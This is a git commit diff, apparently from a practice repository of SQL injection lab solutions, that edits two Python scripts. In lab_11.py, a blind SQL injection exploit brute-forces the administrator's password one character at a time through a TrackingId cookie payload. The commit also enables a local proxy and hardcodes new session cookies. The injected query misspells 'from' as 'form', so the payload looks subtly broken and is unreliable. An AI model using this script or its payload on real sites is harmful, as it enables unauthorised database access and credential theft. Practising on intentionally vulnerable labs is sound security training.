79d9a32f1dc3cf3b4f340bb1b1ad1efec9b901af
emonhossain151 <ehosan151@gmail.com>
2025-03-24 00:03:16 +0600

    sqli

--- SQLi/lab_11.py
+++ SQLi/lab_11.py
@@ -4,7 +4,7 @@ import urllib, urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def sqli_password(url):
     password = ""
@@ -12,7 +12,7 @@ def sqli_password(url):
         for ch in range(32, 126):
             payload = "' and (select ascii(substring(password,%s,1)) form users where username='administrator')='%s'--" % (idx, ch)
             payload_encoded = urllib.parse.quote(payload)
-            cookie = {'TrackingId': 'tq56B0iFRvVMtLoB' + payload_encoded,  'session': 'MGF3Ht2T8weIzRwBT6Ra8kQXrCPlnbhz'}
+            cookie = {'TrackingId': 'e9S9DykaeoltJDt4' + payload_encoded,  'session': 'SoNREbnPI66l1p5W6m4Pn6JF56DTorgP'}
             res = requests.get(url, cookies=cookie, verify=False)
             if 'Welcome' not in res.text:
                 sys.stdout.write('\r' + password + chr(ch))
--- SQLi/lab_2.py
+++ SQLi/lab_2.py
@@ -5,7 +5,7 @@ from bs4 import BeautifulSoup
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def get_csrf_token(session, url):
     res = session.get(url, verify=False, proxies=proxies)
